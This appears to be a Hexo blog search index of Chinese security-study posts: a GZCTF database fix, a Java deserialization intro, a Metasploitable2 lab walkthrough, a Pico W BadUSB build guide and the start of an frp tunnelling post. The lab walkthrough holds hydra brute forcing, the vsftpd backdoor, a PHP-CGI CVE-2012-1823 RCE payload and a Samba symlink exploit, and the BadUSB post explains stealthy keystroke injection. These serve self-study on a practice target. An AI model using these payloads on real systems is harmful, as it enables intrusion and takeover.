<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GZCTF安装时数据库报错解决</title>
    <url>/2024/03/23/GZCTF%E5%AE%89%E8%A3%85%E6%97%B6%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h2 id="GZCTF安装时数据库报错解决"><a href="#GZCTF安装时数据库报错解决" class="headerlink" title="GZCTF安装时数据库报错解决"></a>GZCTF安装时数据库报错解决</h2><p>GZCTF 通过 Docker 镜像的方式提供，你可以通过 docker-compose 的方式快速部署一个功能完善的 CTF 平台。我们在安装时，尤其是在一些版本下的系统会存在数据库配置问题。</p>
<p>:one:  这个主要是在<strong>docker-compose up -d</strong>时，GZCTF会将一部分数据(账户信息，题目信息)储存在本地，用永久化存储，而在其中psqlsql的容器中会将sql的配置信息(<strong>postgresql.conf</strong>)挂在到本地。</p>
<p>:two:而一些版本下的系统或者psqsql(高版本)启用 SCRAM-SHA-256 密码身份验证来来确保安全性，但是GZCTF的两个容器通信使用的<strong>md5</strong>的加密方式，导致密码传入psqsql容器后校验失败。</p>
<p>:three:因此需要修改本地和容器内的加密方式为md5加密即可。</p>
<p>:four:进入容器修改会遇到sudo命令等不存在问题，下更新源<strong>apt-get update</strong>即可。</p>
<ul>
<li>修改postgresql.conf参数文件：password_encryption &#x3D; md5</li>
<li>重新载入配置文件：pg_ctl reload -D $PGDATA 或SELECT pg_reload_conf();</li>
<li>查看参数配置是否修改成功：SHOW password_encryption;</li>
<li>重置用户密码：\password user_name</li>
<li>修改pg_hba.conf验证方法，然后reload即可：host  all  all  0.0.0.0&#x2F;0 scram-sha-256改为host  all  all  0.0.0.0&#x2F;0 md5 ##这里host 后面不一定是all all</li>
<li>同理本地修改即可</li>
</ul>
<p><strong>如果遇到docker容器内无法使用sudo命令</strong></p>
<ul>
<li>尝试以管理员方式进入：docker exec -u root -t -i id &#x2F;bin&#x2F;bash               </li>
<li>使用–privileged&#x3D;true进行赋权：docker run -it –privileged&#x3D;true -u&#x3D;root id &#x2F;bin&#x2F;bash</li>
</ul>
]]></content>
      <categories>
        <category>GZCTF</category>
      </categories>
      <tags>
        <tag>psqsql</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA安全入门学习一</title>
    <url>/2023/11/12/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    <content><![CDATA[<hr>
<p><del>制胜法宝(不是)</del></p>
<iframe src="https://www.bing.com/" width="100%" height="300" name="topFrame" scrolling="yes" noresize="noresize" frameborder="0" id="topFrame"></iframe>

<details> <summary>JAVA安全学习路线</summary> IDEA
    Maven<br>
    Java Web<br>
    反射<br>
    ASM/Javassist<br>
    JNDI：8u191低版本和高版本怎么打(反序列化/本地工厂)，以及如何审计<br>
    RMI是什么<br>
    Java Agent：启动原理和RASP的实现原理<br>
    JMX/JDWP<br>
    反序列化基础：gadget链、JEP290是什么<br>
    FastJson反序列化<br>
    WebLogic：二次反序列化、XML Decoder、IIOP/T3<br>
    Xstream反序列化<br>
    Hessian反序列化：dubbo<br>
    SnakeYAML反序列化<br>
    Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马<br>
    Struts2<br>
    Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用<br>
    Tomcat：Tomcat AJP RCE<br>
    内存马原理：原理是什么、有哪些内存马<br>
    内存马如何查杀<br>
    Log4J<br>
    其他组件漏洞：Apache Solr、Flink<br>
    进阶：tabby、codeql等静态分析 </details>
### 序列化

<p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程；而<strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。</p>
<blockquote>
<p>字节，也就是<em>byte</em> *，1byte &#x3D; 8bit，也就是一个字节等于8位，每一位都是用0或者1来表示，在内存中，数据就是以 <em>二进制</em> 的形式存储的</p>
</blockquote>
<p>序列化是将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。 </p>
<p>Java其自身是有一套序列化机制，可以把Java对象序列化成字节序列，还可以把自己序列再通过反序列化还原成原来的对象！</p>
<h4 id="JAVA序列化样例"><a href="#JAVA序列化样例" class="headerlink" title="JAVA序列化样例"></a>JAVA序列化样例</h4><p>序列化在 Java 中是通过 &#96;&#96;java.io.Serializable &#96;接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。</p>
<p>例如以下序列化代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">      e.name = <span class="string">&quot;Reyan Ali&quot;</span>;</span><br><span class="line">      e.address = <span class="string">&quot;Phokka Kuan, Ambehta Peer&quot;</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./employee.ser&quot;</span>);</span><br><span class="line">         <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">         out.writeObject(e);</span><br><span class="line">         out.close();</span><br><span class="line">         fileOut.close();</span><br><span class="line">         System.out.printf(<span class="string">&quot;Serialized data is saved in /tmp/employee.ser&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">          i.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">---同目录下Employee.java文件</span><br><span class="line">  <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">public</span> String address;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">--反序列化代码</span><br><span class="line">   <span class="type">Employee</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./employee.ser&quot;</span>);</span><br><span class="line">      <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">      obj = (Employee ) in.readObject();</span><br><span class="line">      in.close();</span><br><span class="line">      fileIn.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException i) &#123;</span><br><span class="line">      i.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException i) &#123;</span><br><span class="line">      i.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;Deserialized Employee...&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Name: &quot;</span> + e.name);</span><br></pre></td></tr></table></figure>

<p>可以看到已写入二进制文件ser中</p>
<p><img src="/2023/11/12/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E4%B8%80/1.png" alt="1"></p>
<h4 id="JAVA序列化–接口"><a href="#JAVA序列化–接口" class="headerlink" title="JAVA序列化–接口"></a>JAVA序列化–接口</h4><p>接口通常以interface来声明。接口并不是类，虽然接口的编写方式和类很相似，但是它们属于不同的概念。 <strong>类描述对象的属性和方法。接口则包含类要实现的方法。</strong></p>
<p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p>
<p>接口文件保存在 .java 结尾的文件中，文件名使用接口名。接口的字节码文件保存在 .class 结尾的文件中。接口相应的字节码文件必须在与包名称相匹配的目录结构中。接口不能用于实例化对象。接口没有构造方法。接口不能包含成员变量，除了 static 和 final 变量。</p>
<p>接口的声明格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> interface 接口名称 [extends 其他的接口名] &#123;       </span><br><span class="line">		<span class="comment">// 变量与抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在序列化中要使用implements Serializable (<em>实现Serializable接口</em>)接口什声明此类可以被序列化</p>
<p>Serializable 类中没有任何方法和属性但一定要声明,用来表示这个类允许把对象转换为流形式储存和传输。</p>
<h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>只要服务端反序列化数据，客户端传递类的readObject中的代码便会自动执行，从而使恶意代码可以在服务器上执行。</p>
<h5 id="readObject-简介"><a href="#readObject-简介" class="headerlink" title="readObject()简介"></a>readObject()简介</h5><p>readObject()是ObjectInputStream类中的一个方法,它用于从输入流中反序列化对象。</p>
<blockquote>
<p>ObjectInputStream可以序列化对象到输出流,同时也可以从输入流中反序列化对象。readObject()方法就是用于对象的反序列化。</p>
</blockquote>
<p>readObject()方法的具体作用和过程:</p>
<ul>
<li>从输入流(如FileInputStream)中读取serialized对象的描述信息。</li>
<li>根据描述信息反序列化对象,将对象重构并创建在JVM内存中。</li>
<li>返回反序列化后的对象引用。</li>
</ul>
<p>通过readObject()可以反序列化get shell等。</p>
<hr>
<p>会先做ctfshow的java的基础题，等到序列化后在更新</p>
<p>。。。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全,序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>KSA软件应用及学习</title>
    <url>/2024/03/13/KSA%E8%BD%AF%E4%BB%B6%E5%BA%94%E7%94%A8%E5%8F%8A%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Metasploitable2靶机本地练习记录</title>
    <url>/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Metasploitable2靶机本地练习记录"><a href="#Metasploitable2靶机本地练习记录" class="headerlink" title="Metasploitable2靶机本地练习记录"></a>Metasploitable2靶机本地练习记录</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>靶机ip: 192.168.80.129（位置）</p>
<blockquote>
<p>kali下对整个c端扫描 nmap  -sn   192.168.80.0&#x2F;24    (ping扫描)（arp-scan -l)</p>
</blockquote>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png" alt="1"></p>
<p>找到位置ip：192.168.80.129</p>
<blockquote>
<p>端口扫描 nmap （-sS) -sT  –min-rate 10000 -p- 192.168.80.129 -OA  nmapscan&#x2F;ports</p>
<p>获得端口后提取到txt文本 grep open  nmapscan&#x2F;ports.nmap | awk -F  ‘&#x2F;‘  ‘{print  $1}’  | paste -sd ‘,’  </p>
</blockquote>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/2-16990060476021.png" alt="2">          </p>
<p>写入变量$ports中方便后续使用</p>
<blockquote>
<p>查看靶机详细信息 nmap -sT -sV -O -p$ports(tab) 192.168.80.129 -oa nmapscan&#x2F;detail</p>
<p>获得各个开放端口的应用信息：</p>
</blockquote>
<p> <img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png" alt="3"></p>
<h3 id="21端口攻击"><a href="#21端口攻击" class="headerlink" title="21端口攻击"></a>21端口攻击</h3><blockquote>
<p>扫描结果返回为ftp 2.3.4版本。google得知为vsftpd笑脸<em>漏洞</em>msf下验证并执行playload（这个有匿名登入的风险，后面会讲到）</p>
</blockquote>
<p> <img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png" alt="4"></p>
<p>找到对应版本后，set参数并run命令</p>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png" alt="6"></p>
<p>直接拿到root权限</p>
<h3 id="22端口攻击"><a href="#22端口攻击" class="headerlink" title="22端口攻击"></a>22端口攻击</h3><blockquote>
<p>nmap下sV扫描版本信息为  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)，msf直接搜索漏洞未果，那么有可能像ftp匿名登录或者弱口令，利用hydra直接爆破</p>
<p>hydra 192.168.206.216 -L user字典 -P  passwd字典 -u IP ssh,由于没得字典，所以利用了其他工具得到账户msfdamin&#x2F;msfadmin ,但是没想到还扫出来多个弱口令，比如ftp的匿名登录</p>
<p>kali下登录ssh <a href="mailto:&#109;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#48;&#46;&#49;&#x32;&#x39;">&#109;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#48;&#46;&#49;&#x32;&#x39;</a> 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户）</p>
</blockquote>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png" alt="7"></p>
<h3 id="23端口攻击"><a href="#23端口攻击" class="headerlink" title="23端口攻击"></a>23端口攻击</h3><blockquote>
<p>版本信息为telnet服务，同样是弱口令，根据靶机特性，一般所有服务多为同一账户密码。开始是思路为同样可通过22端口攻击的方式复刻出来，账户密码为msfadmin&#x2F;msfadmin。shell下&gt;远程登入即可拿到当前用户的shell。但登入是它直接告诉你了账户密码（-__-）。</p>
</blockquote>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png" alt="8"></p>
<h3 id="25与53端口攻击"><a href="#25与53端口攻击" class="headerlink" title="25与53端口攻击"></a>25与53端口攻击</h3><blockquote>
<p>smtp协议多用于邮件传输当中,此处漏洞同样为弱口令,账户密码:msfadmin&#x2F;msfadmin</p>
<p>domain称网域，是由一串用点分隔的名字组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）目前还不会,以后在更新</p>
</blockquote>
<h3 id="80端口攻击"><a href="#80端口攻击" class="headerlink" title="80端口攻击"></a>80端口攻击</h3><p>打开网站查看:</p>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png" alt="9"></p>
<p>目录扫描没有得到可用结果</p>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png" alt="10"></p>
<blockquote>
<p>里面自带以下漏洞靶场便不做演示</p>
<p>以下利用的其他漏洞，访问phpinfo.php得到php版本信息为：php为5.24，存在[PHP-CGI远程&gt;代码执行漏洞CVE-2012-1823]</p>
<p>其就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求&gt;所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了&gt;一系列结果。CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行&gt;的php中</p>
<p>在文件后接**?-s**后会显示出源码,例如</p>
</blockquote>
<p> <img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png" alt="11"></p>
<p>远程rce的poc为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST:  <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -al&quot;</span>); <span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png" alt="12"></p>
<h5 id="cgi模式下的参数"><a href="#cgi模式下的参数" class="headerlink" title="cgi模式下的参数"></a>cgi模式下的参数</h5><ul>
<li>-c 指定php.ini文件的位置</li>
<li>n 不要加载php.ini文件</li>
<li>-d 指定配置项</li>
<li>-b 启动fastcgi进程</li>
<li>-s 显示文件源码</li>
<li>-T 执行指定次该文件</li>
<li>-h和-? 显示帮助</li>
</ul>
<h3 id="445端口利用"><a href="#445端口利用" class="headerlink" title="445端口利用"></a>445端口利用</h3><p>该端口利用为CVE-2010-0926。</p>
<p>nmap扫描得到445端口信息为 netbios-ssn Samba smbd 3.X - 4.X 。msf查找相关漏洞，并利用</p>
<p>利用auxiliary&#x2F;admin&#x2F;smb&#x2F;samba_symlink_traversal模块进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br><span class="line">Set RHOST 192.168.80.129 </span><br><span class="line">set SMBSHARE tmp 设置SAM可写文件</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png" alt="13"></p>
<p>利用成功，输入smbclient  &#x2F;&#x2F;192.168.80.129&#x2F;tmp（提示输入密码处，直接回车即可），之后切换rootfs即可利用成功</p>
<p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png" alt="14"></p>
<p>6667端口攻击</p>
<p>待续。。。。</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>CVE,靶机,Metasploitable2</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry-pico-W制作badusb</title>
    <url>/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/</url>
    <content><![CDATA[<h3 id="BadUsb与HID攻击"><a href="#BadUsb与HID攻击" class="headerlink" title="BadUsb与HID攻击"></a>BadUsb与HID攻击</h3><h4 id="BadUsb"><a href="#BadUsb" class="headerlink" title="BadUsb"></a>BadUsb</h4><blockquote>
<p>BadUSB 是一种利用 USB 固件固有漏洞的攻击。此类攻击会对 USB 设备进行重新编程，使其充当人机接口设备；一旦经过重新设计，USB 设备就会被用来在受害者的计算机上谨慎地执行命令或运行恶意程序。</p>
<p>​														                                                                            ——<a href="https://www.manageengine.com/">BADUSB</a></p>
</blockquote>
<p>其是带有嵌入式固件的闪存驱动器，可用于重新编程设备并允许它充当人机界面小工具，例如键盘、鼠标或耳机。它们用于通过有效地伪装成人机接口设备 （HID） 在计算机上执行各种操作。BadUSB可以预先编程以在计算机上键入字符(无需物理操作)。插入后就可以直接开始工作，甚至执行需要同时使用两个或多个键的复杂击键。</p>
<h4 id="HID攻击"><a href="#HID攻击" class="headerlink" title="HID攻击"></a>HID攻击</h4><p>HID（Human InterfaceDevice），是指计算机直接与人交互的设备，例如键盘、鼠标等。BadUsb攻击便属于其中一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。</p>
<p>pc端上的HID一般指的是USB-HID标准，大多是指微软在USB委员会上提议创建的一个人体学输入设备工作组。</p>
<h3 id="Raspberry-pico-W"><a href="#Raspberry-pico-W" class="headerlink" title="Raspberry pico W"></a>Raspberry pico W</h3><p>Raspberry Pi Pico 是一款搭载了 RP 2040 芯片的微处理器开发板。对于 Pico 的编程开发，官方开发了 <a href="https://sspai.com/link?target=https://datasheets.raspberrypi.org/pico/sdk/pico_c_sdk.pdf">Pico C&#x2F;C++ SDK</a> 和 <a href="https://sspai.com/link?target=https://datasheets.raspberrypi.org/pico/sdk/pico_python_sdk.pdf">Pico Python SDK</a> 软件开发工具包，用户可以选择 C&#x2F;C++ 或者 Python 对 Pico 进行开发。</p>
<p><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/4cbf7fedd48fc86177e461582368fae2.jpg"></p>
<p>其规格参数如下：<br><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/1709462560513.png"></p>
<h3 id="Python-SDK-开发制作badusb"><a href="#Python-SDK-开发制作badusb" class="headerlink" title="Python SDK 开发制作badusb"></a>Python SDK 开发制作badusb</h3><p> Python SDK 开发 Pico 的思路是，将 MicroPython（微处理器上运行的 Python 固件）拖拽到 Pico 中，然后将计算机上的 Python (3)代码传给 Pico 运行。树莓派官网提供了MicroPython固件，只需要将其烧录进去即可。已经编译好的固件：<a href="https://www.raspberrypi.org/documentation/rp2040/getting-started/">getting-started</a>这里可以下载到</p>
<p>首先按住BOOTSET选项并链接USB接口到计算机上，其将显示为名为 RPI-RP2 的可移动媒体设备（但注意是识别出来容量可能有误，具体按照产品参数为准）并生成INDEX.HTM和INFO_UF2.TXT文件<br><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/%7BF9519DD5-C17F-4728-9D05-168685C8900B%7D.png"></p>
<!-- <img src="/2024/03/03/Raspberry-pico-W制作badusb/undefined"  alt="{F9519DD5-C17F-4728-9D05-168685C8900B}" style="zoom:80%;" /> -->

<p>下载<a href="https://downloads.circuitpython.org/bin/raspberry_pi_pico_w/en_US/adafruit-circuitpython-raspberry_pi_pico_w-en_US-8.2.10.uf2">adafruit-circuitpython-raspberry_pi_pico-en_US-8.2.10.uf2</a> 到设备的根目录下，大约3秒后设备将会自动重启，并命名为CIRCUITPY设备并重新连接。生成以下文件：</p>
<p><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/%7B40AE3F73-9CBF-4337-9ACC-262E25518D0B%7D.png" alt="{40AE3F73-9CBF-4337-9ACC-262E25518D0B}"></p>
<p>下载<a href="https://github.com/dbisu/pico-ducky/releases">安装包</a> 并将lib下的这些文件(夹)放入到设备的lib目录下：</p>
<p><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/%7B57EC5B07-65DE-42b9-A956-DAC52FBC70B0%7D.png"></p>
<p>将下载文件中的下列文件移动到设备根目录下：</p>
<p><img src="/2024/03/03/Raspberry-pico-W%E5%88%B6%E4%BD%9Cbadusb/67DC1DC4.png"></p>
<p>完成后电脑会自动打开cmd执行helloword代码。其中payload.dd装载的是执行的脚本</p>
<h3 id="USB-启用-禁用模式"><a href="#USB-启用-禁用模式" class="headerlink" title="USB 启用&#x2F;禁用模式"></a>USB 启用&#x2F;禁用模式</h3><p>对于攻击或测试时，可能并不想要显示出或被是辨别成大容量储存设备</p>
<ul>
<li>进入设置模式。</li>
<li>将您的有效负载脚本复制到 pico-ducky。</li>
<li>断开 pico 与主机的连接。</li>
<li><code>GND</code>在引脚 18 ( ) 和引脚 20 ( )之间连接跳线<code>GPIO15</code>。这将防止 pico-ducky 在插入目标计算机时显示为 USB 驱动器。</li>
<li>取下跳线并重新连接到您的电脑以重新编程。</li>
</ul>
<blockquote>
<p>pico上同时可以储存多个有效载荷，其与引脚的关系为：	</p>
<p>GP4 - payload.dd 	GP5 - payload2.dGP10 -  payload3.dd 	GP11 -  payload4.dd</p>
</blockquote>
<h3 id="pico的重置"><a href="#pico的重置" class="headerlink" title="pico的重置"></a>pico的重置</h3><p>在使用时经常会使用到重置功能来完成特定功能和解决一些问题，具体操作如下：</p>
<ul>
<li><a href="https://datasheets.raspberrypi.com/soft/flash_nuke.uf2">从flash_nuke.uf2</a>下载重置固件</li>
<li>按住 Pico 上的 BOOTSEL 按钮，将 USB 电缆插入计算机（该步骤会删除掉设备的所有内容）。</li>
<li>当 设备 RPI-RP2被计算机识别时，将 flash_nuke.uf2 文件复制到 设备</li>
</ul>
<h3 id="BadUsb—-payload-dd编辑"><a href="#BadUsb—-payload-dd编辑" class="headerlink" title="BadUsb—-payload.dd编辑"></a>BadUsb—-payload.dd编辑</h3><p>如果想实现自定义的脚本命令攻击，其主要更改的便是payload.dd文件</p>
<p>首先要理解payload.dd文件是以什么方式(语言)编写的。这里参考“官方的解释”<a href="https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference">《DuckyScript™ 快速参考》</a></p>
<ul>
<li><p>REM:	命令不执行任何击键注入功能。<code>REM</code>它的名字来源于单词“remark”。虽然<code>REM</code>空行可用于在有效负载内添加垂直间距，但空行也是可接受的，并且不会被编译器处理。</p>
</li>
<li><p>STRING:   命令<code>STRING</code>击键注入（类型）一系列击键。必要时<code>STRING</code>按住修饰键将自动解释大写字母。<code>SHIFT</code>该<code>STRING</code>命令还将自动按 SPACE 光标键，但尾随空格将被省略。</p>
</li>
<li><p>STRINGLN:   命令（如<code>STRING</code>）将注入一系列击键，然后以回车符 ( <code>ENTER</code>) 终止。</p>
</li>
<li><p>光标键：用于将光标导航到屏幕上的不同位置，主要有：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UP DOWN LEFT RIGHT</span><br><span class="line">UPARROW DOWNARROW LEFTARROW RIGHTARROW</span><br><span class="line">PAGEUP PAGEDOWN HOME END</span><br><span class="line">INSERT DELETE DEL BACKSPACE</span><br><span class="line">TAB</span><br><span class="line">SPACE</span><br></pre></td></tr></table></figure>
</li>
<li><p>基本修饰键：与另一个键组合使用以执行特殊功能。PC 的常见键盘组合包括熟悉的<code>CTRL c</code>复制、<code>CTRL x</code>剪切和<code>CTRL v</code>粘贴键盘组合。注意的时windows键命令为GUI</p>
</li>
<li><p>DELAY:  命令指示 USB Rubber Ducky 暂时暂停有效负载的执行。当部署必须“等待”元素（例如窗口）加载的有效负载时，这非常有用。该<code>DELAY</code>命令接受以毫秒为单位的时间参数。<strong>注意最小延迟值为 20</strong></p>
</li>
<li><p>比较和逻辑运算：该脚本语言同样支持数学比较逻辑符号和逻辑运算符 。</p>
</li>
<li><p>WHILE :  支持WHILE的循环语句。：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">VAR <span class="variable">$FOO</span> = 42   //<span class="variable">$FOO</span>自定义变量</span><br><span class="line">WHILE ( <span class="variable">$FOO</span> &gt; 0 ) </span><br><span class="line">    STRINGLN This message will repeat 42 <span class="built_in">times</span>.</span><br><span class="line"></span><br><span class="line">    <span class="variable">$FOO</span> = ( <span class="variable">$FOO</span> - 1 )</span><br><span class="line"></span><br><span class="line">END_WHILE //结束标识</span><br></pre></td></tr></table></figure>

<p>该脚本还支持其实还有诸如自定义函数，载荷隐藏，抖动，随机化等更为复杂的命令和功能。</p>
</li>
</ul>
<h3 id="pico-W的ap网络功能"><a href="#pico-W的ap网络功能" class="headerlink" title="pico W的ap网络功能"></a>pico W的ap网络功能</h3><p>待更新&gt;&gt;&gt;&gt;……….(提醒：实用软件：<strong>Thonny</strong> )</p>
]]></content>
      <categories>
        <category>hack硬件</category>
      </categories>
      <tags>
        <tag>pico</tag>
      </tags>
  </entry>
  <entry>
    <title>frp内网穿透</title>
    <url>/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h3 id="frp在liunx和windows下实现穿透"><a href="#frp在liunx和windows下实现穿透" class="headerlink" title="frp在liunx和windows下实现穿透"></a>frp在liunx和windows下实现穿透</h3><h4 id="网络拓扑图如下"><a href="#网络拓扑图如下" class="headerlink" title="网络拓扑图如下"></a>网络拓扑图如下</h4><p><img src="/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/11.jpg"></p>
<p>下载frp包（包含liunx&#x2F;windows下的可执行程序和配置文件）</p>
